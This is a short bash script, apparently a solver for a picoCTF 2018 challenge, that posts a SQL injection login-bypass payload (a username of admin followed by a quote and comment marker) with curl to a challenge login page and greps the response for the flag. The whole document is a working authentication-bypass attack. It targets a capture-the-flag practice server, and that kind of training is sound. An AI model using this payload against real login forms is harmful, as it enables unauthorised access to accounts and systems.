#!/bin/bash

# sqli on form
curl -s -X POST -d "username=admin' --&password=yolo" http://2018shell.picoctf.com:53261/login.php | grep -oE 'picoCTF{.*}'
